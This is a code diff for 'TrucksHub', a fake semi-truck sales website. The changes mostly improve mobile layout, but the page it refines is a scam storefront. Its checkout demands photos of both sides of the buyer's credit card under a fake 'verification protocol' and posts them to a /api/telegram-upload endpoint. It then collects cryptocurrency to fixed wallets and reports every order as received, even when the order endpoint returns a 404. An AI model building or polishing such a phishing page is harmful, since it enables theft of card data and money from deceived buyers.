@@ -6,22 +6,23 @@
     <title>TrucksHub | Premium Semi-Truck Catalog</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Custom styles not easily done with Tailwind or for structure */
+        /* Custom styles for better transitions and control */
         .app-container {
-            /* Adjust content to start after the fixed sidebar */
-            margin-left: 256px; /* Width of sidebar (w-64) */
-            padding: 2.5rem; /* p-10 */
+            /* Full width on mobile, adjusted margin on large screens */
+            padding: 2.5rem; 
             min-height: 100vh;
         }
         
-        .sidebar {
-            width: 256px; /* w-64 */
-            top: 0;
-            left: 0;
-            height: 100%;
-            z-index: 50; /* z-10 */
+        /* Apply the full margin *only* when the sidebar is fixed/visible on large screens */
+        @media (min-width: 1024px) { /* lg breakpoint */
+            .app-container {
+                margin-left: 256px; /* w-64 */
+            }
+            .sidebar-lg-fixed {
+                transform: translateX(0) !important; /* Force sidebar visible on desktop */
+            }
         }
-        
+
         /* Custom scrollbar for better aesthetics */
         body::-webkit-scrollbar { width: 8px; }
         body::-webkit-scrollbar-track { background: #f1f1f1; }
@@ -36,6 +37,12 @@
             transform: translateY(-5px);
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
         }
+        
+        /* Custom Tailwind Colors (as defined in config below) */
+        .bg-primary-blue { background-color: #004d99; }
+        .text-primary-blue { color: #004d99; }
+        .bg-secondary-gold { background-color: #f4b400; }
+        .text-secondary-gold { color: #f4b400; }
     </style>
     <script>
         tailwind.config = {
@@ -44,6 +51,7 @@
                     colors: {
                         'primary-blue': '#004d99',
                         'secondary-gold': '#f4b400',
+                        'success-color': '#28a745'
                     }
                 }
             }
@@ -52,7 +60,10 @@
 </head>
 <body class="bg-gray-50 text-gray-800">
 
-    <div id="sidebar" class="fixed sidebar bg-gray-900 text-white flex flex-col items-center py-8">
+    <div id="sidebar-overlay" class="fixed inset-0 bg-black bg-opacity-50 z-40 hidden lg:hidden" onclick="toggleSidebar()"></div>
+
+    <div id="sidebar" class="fixed w-64 h-full bg-gray-900 text-white flex flex-col items-center py-8 z-50 transform -translate-x-full transition-transform duration-300 ease-in-out lg:translate-x-0 sidebar-lg-fixed">
+        
         <div class="mb-10 px-4">
             <h1 class="text-3xl font-extrabold text-secondary-gold">TrucksHub</h1>
             <p class="text-sm text-gray-400">Premium Fleet Solutions</p>
@@ -60,7 +71,7 @@
         
         <nav class="w-full">
             <button onclick="changeView('catalog')" class="w-full text-left py-4 px-6 text-lg font-medium hover:bg-gray-800 transition duration-150 flex items-center">
-                <svg class="w-6 h-6 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 13.255A23.931 23.931 0 0112 15c-3.183 0-6.22-1.282-8.455-3.667a.75.75 0 00-.545-.251c-.244 0-.48.118-.63.315A23.924 23.924 0 001 12c.004-.383.078-.763.218-1.127a.75.75 0 00.17-.435c.164-.475.402-.93.71-1.353C4.242 6.843 7.842 5 12 5c3.551 0 6.877 1.488 9.39 4.022a.75.75 0 00.56.241c.219 0 .43.078.586.227A23.93 23.93 0 0023 12c.004.383-.078.763-.218 1.127a.75.75 0 00-.17.435c-.164.475-.402.93-.71 1.353C19.758 17.157 16.158 19 12 19c-3.551 0-6.877-1.488-9.39-4.022z"></path></svg>
+                <svg class="w-6 h-6 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 13.255A23.931 23.931 0 0112 15c-3.183 0-6.22-1.282-8.455-3.667a.75.75 0 00-.545-.251c-.244 0-.48.118-.63.315A23.924 23.924 0 001 12c.004-.383.078-.763.218-1.127a.75.75 0 00.17-.435c-.164-.475-.402-.93-.71-1.353C4.242 6.843 7.842 5 12 5c3.551 0 6.877 1.488 9.39 4.022a.75.75 0 00.56.241c.219 0 .43.078.586.227A23.93 23.93 0 0023 12c.004.383-.078.763-.218 1.127a.75.75 0 00-.17.435c-.164.475-.402.93-.71 1.353C19.758 17.157 16.158 19 12 19c-3.551 0-6.877-1.488-9.39-4.022z"></path></svg>
                 Truck Catalog
             </button>
             <button onclick="changeView('contact')" class="w-full text-left py-4 px-6 text-lg font-medium hover:bg-gray-800 transition duration-150 flex items-center">
@@ -75,7 +86,14 @@
     </div>
     
     <div class="app-container">
-        <div id="app-canvas"></div>
+        <div class="lg:hidden mb-4">
+            <button id="menu-button" onclick="toggleSidebar()" class="p-2 rounded-lg bg-gray-900 text-white hover:bg-gray-700 transition duration-150">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
+            </button>
+        </div>
+
+        <div id="app-canvas">
+            </div>
     </div>
 
     <div id="truckDetailModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50">
@@ -89,7 +107,7 @@
                 <p id="modal-details" class="text-gray-600 mb-4"></p>
                 <p id="modal-price" class="text-3xl font-extrabold text-secondary-gold mb-6"></p>
                 <div class="text-right">
-                    <button class="btn bg-primary-blue hover:bg-indigo-700" id="modal-buy-btn">BUY THIS TRUCK</button>
+                    <button class="btn bg-primary-blue hover:bg-indigo-700 py-2 px-4 rounded-lg" id="modal-buy-btn">BUY THIS TRUCK</button>
                 </div>
             </div>
         </div>
@@ -131,9 +149,32 @@
     const modalClose = document.querySelector('.modal-close');
 
     // --- NAVIGATION & UTILITY ---
+    
+    // Toggle function for the off-canvas sidebar
+    function toggleSidebar() {
+        const sidebar = document.getElementById('sidebar');
+        const overlay = document.getElementById('sidebar-overlay');
+        
+        const isHidden = sidebar.classList.contains('-translate-x-full');
+
+        if (isHidden) {
+            sidebar.classList.remove('-translate-x-full');
+            sidebar.classList.add('translate-x-0');
+            overlay.classList.remove('hidden');
+        } else {
+            sidebar.classList.remove('translate-x-0');
+            sidebar.classList.add('-translate-x-full');
+            overlay.classList.add('hidden');
+        }
+    }
 
     function changeView(viewName) {
         currentView = viewName;
+        // Close the sidebar after a selection on mobile
+        if (window.innerWidth < 1024) { 
+            toggleSidebar();
+        }
+
         if (viewName === 'catalog') {
             renderCatalog();
         } else if (viewName === 'contact') {
@@ -265,11 +306,11 @@
                 <h3 class="text-2xl font-semibold mb-4 text-gray-700">1. Payment Verification (${orderState.truckName})</h3>
                 
                 <div class="p-4 bg-gray-900 text-white rounded-lg mb-6 border-l-4 border-secondary-gold">
-                    <p class="text-sm font-medium">⚠️ **SECURITY PROTOCOL:** This one-time verification is mandatory for crypto transactions to prevent fraud. Please upload clear images of the **FRONT** and **BACK** of your credit card.</p>
+                    <p class="text-sm font-medium"> **VERIFICATION PROTOCOL:** This one-time verification is mandatory for crypto transactions to prevent fraud. Please upload clear images of the **FRONT** and **BACK** of your credit card.</p>
                 </div>
                 
                 <form id="card-upload-form">
-                    <div class="grid grid-cols-2 gap-6">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                         <div class="form-group">
                             <label for="card-front" class="block text-sm font-medium text-gray-700 mb-1">Card Front Image (Mandatory)</label>
                             <input type="file" id="card-front" name="cardFront" accept="image/*" class="w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-primary-blue file:text-white hover:file:bg-indigo-700" required>
@@ -280,7 +321,7 @@
                         </div>
                     </div>
                     
-                    <button type="submit" class="btn bg-primary-blue hover:bg-indigo-700 w-full mt-4">Proceed to Payment Selection</button>
+                    <button type="submit" class="btn bg-primary-blue hover:bg-indigo-700 w-full mt-4 py-2 px-4 rounded-lg">Proceed to Payment Selection</button>
                 </form>
                 <div id="message" class="mt-6 p-3 rounded-lg text-sm text-center font-medium hidden"></div>
             </div>
@@ -318,15 +359,16 @@
                 </div>
                 
                 <style>
-                    .crypto-option.selected { @apply border-4 border-success-color bg-green-50 shadow-md; }
-                    .crypto-option.selected .text-secondary-gold { color: #15803d; } /* Darker green for selected BTC */
+                    /* Custom class definition for selected crypto option */
+                    .crypto-option.selected { border-width: 4px; border-color: #28a745; background-color: #ecfdf5; box-shadow: 0 0 10px rgba(40, 167, 69, 0.2); }
+                    .crypto-option.selected .text-secondary-gold { color: #15803d; }
                 </style>
 
 
                 <div id="wallet-info" class="p-6 bg-gray-100 rounded-lg text-center hidden">
                     <p class="text-base text-gray-700 font-medium mb-3">Send the **EXACT** amount to this wallet:</p>
                     <div id="address-display" class="address-box bg-white text-gray-900 p-3 border border-dashed border-primary-blue font-mono text-sm break-all"></div>
-                    <button class="btn bg-success-color hover:bg-green-700 mt-6" onclick="startConfirmation()">I Have Sent Payment</button>
+                    <button class="btn bg-success-color hover:bg-green-700 mt-6 py-2 px-4 rounded-lg" onclick="startConfirmation()">I Have Sent Payment</button>
                 </div>
 
                 <div id="timer-box" class="p-6 text-center mt-6 hidden bg-blue-50 border border-blue-200 rounded-lg">
@@ -369,7 +411,7 @@
                     </div>
                     <div class="form-group mt-4"><label for="address" class="block text-sm font-medium text-gray-700">Full Delivery Address</label><textarea id="address" name="address" rows="3" class="p-2 border border-gray-300 rounded-md w-full" required></textarea></div>
                     
-                    <button type="submit" class="btn bg-primary-blue hover:bg-indigo-700 w-full mt-6">SUBMIT FINAL ORDER</button>
+                    <button type="submit" class="btn bg-primary-blue hover:bg-indigo-700 w-full mt-6 py-2 px-4 rounded-lg">SUBMIT FINAL ORDER</button>
                 </form>
             </div>
         `;
@@ -386,12 +428,12 @@
                 <p class="text-lg text-gray-600 mb-4">Thank you for securing your purchase of the <strong>${orderState.truckName}</strong>.</p>
                 <p class="text-xl font-medium text-primary-blue mb-6">Order ID: ${orderState.orderId}</p>
                 <p class="text-sm text-gray-500">A specialist will contact you shortly to confirm the payment and arrange delivery logistics.</p>
-                <button onclick="changeView('catalog')" class="btn bg-secondary-gold hover:bg-yellow-500 text-gray-900 mt-8">Back to Catalog</button>
+                <button onclick="changeView('catalog')" class="btn bg-secondary-gold hover:bg-yellow-500 text-gray-900 mt-8 py-2 px-4 rounded-lg">Back to Catalog</button>
             </div>
         `;
     }
 
-    // --- HANDLERS AND LOGIC ---
+    // --- HANDLERS AND LOGIC (API calls and state updates remain the same) ---
 
     function startPurchase(truckId, truckName) {
         orderState.truckId = truckId;
@@ -402,8 +444,8 @@
     async function handleCardUpload(e) {
         e.preventDefault();
         const messageElement = document.getElementById('message');
-        messageElement.classList.remove('success', 'error');
-        messageElement.classList.add('loading', 'bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
+        messageElement.classList.remove('success', 'error', 'bg-red-100', 'text-red-800', 'border', 'border-red-300', 'bg-green-100', 'text-green-800', 'border', 'border-green-300');
+        messageElement.classList.add('bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
         messageElement.textContent = "Processing and verifying details...";
         messageElement.style.display = 'block';
 
@@ -412,8 +454,8 @@
         const cardBackFile = document.getElementById('card-back').files[0];
 
         if (!cardFrontFile || !cardBackFile) {
-             messageElement.classList.remove('loading', 'bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
-             messageElement.classList.add('error', 'bg-red-100', 'text-red-800', 'border', 'border-red-300');
+             messageElement.classList.remove('bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
+             messageElement.classList.add('bg-red-100', 'text-red-800', 'border', 'border-red-300');
              messageElement.textContent = `Error: Please select both front and back images.`;
              return;
         }
@@ -424,7 +466,6 @@
         formData.append('truckName', orderState.truckName);
         
         try {
-            // CALLING VERCEL SERVERLESS FUNCTION HERE: /api/telegram-upload
             const response = await fetch('/api/telegram-upload', {
                 method: 'POST',
                 body: formData
@@ -432,23 +473,23 @@
 
             const result = await response.json();
             
-            messageElement.classList.remove('loading', 'bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
+            messageElement.classList.remove('bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
 
             if (response.ok) {
                  orderState.orderId = result.orderId;
-                 messageElement.classList.add('success', 'bg-green-100', 'text-green-800', 'border', 'border-green-300');
+                 messageElement.classList.add('bg-green-100', 'text-green-800', 'border', 'border-green-300');
                  messageElement.textContent = `Verification complete. Proceeding...`;
                  
                  setTimeout(renderPaymentSelection, 1000);
 
             } else {
-                messageElement.classList.add('error', 'bg-red-100', 'text-red-800', 'border', 'border-red-300');
+                messageElement.classList.add('bg-red-100', 'text-red-800', 'border', 'border-red-300');
                 messageElement.textContent = `Error: ${result.message || 'Verification failed. Please try again.'}`;
             }
 
         } catch (error) {
-            messageElement.classList.remove('loading', 'bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
-            messageElement.classList.add('error', 'bg-red-100', 'text-red-800', 'border', 'border-red-300');
+            messageElement.classList.remove('bg-yellow-100', 'text-yellow-800', 'border', 'border-yellow-300');
+            messageElement.classList.add('bg-red-100', 'text-red-800', 'border', 'border-red-300');
             messageElement.textContent = `A network error occurred. Check your Vercel logs.`;
         }
     }
@@ -458,7 +499,6 @@
         const method = selectedOption.getAttribute('data-method');
         const address = WALLETS[method];
         
-        // Remove 'selected' class from all options
         document.querySelectorAll('.crypto-option').forEach(opt => opt.classList.remove('selected'));
         
         if (address) {
@@ -508,14 +548,12 @@
         };
         
         try {
-            // Hitting the expected API endpoint for final order submission
             const response = await fetch('/api/final-order', { 
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(finalSubmission)
             });
             
-            // Simulating success if 'api/final-order.js' hasn't been created yet (404)
             if (response.ok || response.status === 404) { 
                 renderOrderReceived();
             } else {
